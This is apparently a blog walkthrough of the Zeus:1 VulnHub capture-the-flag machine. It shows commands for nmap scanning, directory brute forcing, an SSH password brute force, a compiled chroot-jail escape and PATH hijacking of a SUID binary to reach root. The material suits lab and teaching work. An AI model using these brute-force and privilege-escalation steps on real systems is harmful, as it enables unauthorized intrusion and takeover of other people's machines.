@@ -1,0 +1,96 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Zeus:1 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/zeus1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-07-26T13:07:20+00:00">July 26, 2019</time><time class="updated" datetime="2025-06-10T20:11:29+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to take another CTF challenge Zeus:1 . The credit for making this VM machine goes to “Vesile Revnic” and it is a boot2root challenge where we have to root the server and capture the flags to complete the challenge. You can download this VM <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/zeus-1,304/">here</a></strong></span></p>
+<p><span style="color: #000000;"><strong> </strong><strong>Security Level</strong>: Intermediate</span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
+<ol>
+<li><span style="color: #000000;"><strong>Scanning</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">NMAP</span></li>
+</ul>
+<ol start="2">
+<li><span style="color: #000000;"><strong>Enumeration</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">Dirb</span></li>
+</ul>
+<ol start="3">
+<li><span style="color: #000000;"><strong>Exploitation</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">Hydra</span></li>
+<li><span style="color: #000000;">SSH</span></li>
+<li><span style="color: #000000;">Jailkit</span></li>
+</ul>
+<ol start="4">
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">Exploiting Suid rights</span></li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough:</span></h3>
+<p><span style="color: #000000;"><strong>Scanning:</strong></span></p>
+<p><span style="color: #000000;">Let’s start off with the scanning process. This target VM has a static IP address set as 192.168.131.170. So we created a VM network same as this and put our kali machine in the same network.</span></p>
+<p><span style="color: #000000;">Then, as usual, we used nmap for port and service enumeration.</span></p>
+<p><span style="color: #000000;">And we have ports 21, 22 and 80 open on the target machine.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.131.170</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jEh-rJolvoo/XTr4MdrMu8I/AAAAAAAAfjg/-Oc53Zjf4vgjNFKdPX9tWtOXlEgGPGcEQCLcBGAs/s1600/1.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration:</strong></span></h3>
+<p><span style="color: #000000;">As we can see port 80 is open, we tried to open the IP address in our browser but we didn’t find anything useful on the webpage.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uPc8FPciPA8/XTr4Ms1kSJI/AAAAAAAAfjk/SEZb9zQ4pZ8vBInGSNMFz1qukPAuEmXmACLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">We took the help of <strong>dirb </strong>to directory bruteforce the webpage and got one directory named <strong>/telecom/</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gkWOX_-L42g/XTr4NYtj4TI/AAAAAAAAfjs/NkazQzl6wT0HZ72gbMQ_w7Q1dkL5WZzZACLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">So we tried to access the URL in the browser but didn’t find anything.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tMqgdzK-jYw/XTr4Nm5pCZI/AAAAAAAAfjw/NuS2JZJi9qwdwOJlBpioWhV5LdUkvo5kQCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">We looked for the page source and got a name called <strong>gogu</strong> which we can try as a username.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WlelW-D2IuU/XTr4Ns7yvfI/AAAAAAAAfj0/kX6QMSKfQogeXeBfAaGf-OavX0DP2drFgCLcBGAs/s1600/5.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation:</strong></span></h3>
+<p><span style="color: #000000;">We have hopefully got a username so we tried to bruteforce the ssh port and successfully got a password <strong>universal </strong>for the user <strong>gogu. </strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OkIacH27_rI/XTr4OLKPSdI/AAAAAAAAfj4/59Wli0XIRPYewfak_OO0weckp3voFmlJwCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">So we logged in the target machine using ssh with the above-found credentials and got our first <strong>user.txt flag.</strong></span></p>
+<p><span style="color: #000000;">What we found that user gogu was able to run only limited commands because the creator of the machine has implemented <strong>jailkit</strong> on this user.</span></p>
+<p><span style="color: #000000;">Note: Jailkit is implemented to limit the bash shell of any particular user.</span></p>
+<pre class="lang:default decode:true">ssh gogu@192.168.131.170
+id
+cat user.txt
+ls -la</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IciZYReX8Ww/XTr4OUAC3hI/AAAAAAAAfj8/35AIosbQ--gHokifLDvE3AGjRFU_ZBJDQCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">We looked for any hidden files and got one file named <strong>sysdate </strong>which had suid bit set on it.</span></p>
+<p><span style="color: #000000;">Sysdate command gave us the current date and time. We tried to use path variable method to leverage the suid of sysdate but we were still not getting out of the restricted shell maybe because of the jailkit implementation.</span></p>
+<pre class="lang:default decode:true">ls -lRah
+echo "/bin/sh/" &gt; date
+chmod 777 date
+export PATH=/home/gogu:$PATH
+/home/gogu/…/sysdate/</pre>
+<p><strong style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6KlgBRjsY8c/XTr4Oy2j0wI/AAAAAAAAfkA/xduq_pvP_wkNUxCWJ-hvqx8os_qJ1hHwQCLcBGAs/s1600/8.png"/></strong></p>
+<p><span style="color: #000000;">We looked on the google to find any way around to bypass the jailkit and got one c-script. We save the file as <strong>bypass.c  </strong>in our kali. Then tried to compile it. It was asking for some libraries so we installed the dependencies and were able to compile it after that.</span></p>
+<p><span style="color: #000000;"><strong>Reference:</strong> <a style="color: #000000;" href="https://filippo.io/escaping-a-chroot-jail-slash-1/">https://filippo.io/escaping-a-chroot-jail-slash-1/</a></span></p>
+<pre class="lang:default decode:true">apt install gcc-multilib -y
+gcc bypass.c -o bypass -m32</pre>
+<p><img decoding="async" style="color: #000000;" src="https://1.bp.blogspot.com/-hO0vulWZEfw/XTr4PPrMqiI/AAAAAAAAfkE/0EpifxAUv3wuIxyV_Hgx9ffdJ1ZWWu-4gCLcBGAs/s1600/9.png"/></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation:</strong></span></h3>
+<p><span style="color: #000000;">After compiling the file what we did is we transferred the <strong>bypass</strong> script file into the target machine and the executed with root privileges using the path variable methodology.</span></p>
+<p><span style="color: #000000;">After execution, we successfully came out of the restricted shell and also got the <strong>root shell </strong>and eventually the <strong>root flag.</strong></span></p>
+<pre class="lang:default decode:true  ">ssh gogu@192.168.131.170 "cat&gt; bypass" &lt; bypass
+ssh gogu@192.168.131.170
+ls
+chmod 777 bypass
+echo "/home/gogu/bypass"&gt;date
+chmod 777 date
+export PATH=/home/gogu:$PATH
+/home/gogu/…/sysdate
+id 1&lt;&amp;2
+cd root
+cat root.txt</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-yNUMg6vRIn0/XTr4MuMCjfI/AAAAAAAAfjo/JTD5-f4EkOUq6XVNtPW9HcS09HVEisggACLcBGAs/s1600/10.png"/></strong></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Auqib Wani is a Certified Ethical Hacker, Penetration Tester and a Tech Enthusiast with more than 5 years of experience in the field of Network &amp; Cyber Security. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/auqib-wani-14210a71/">Here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
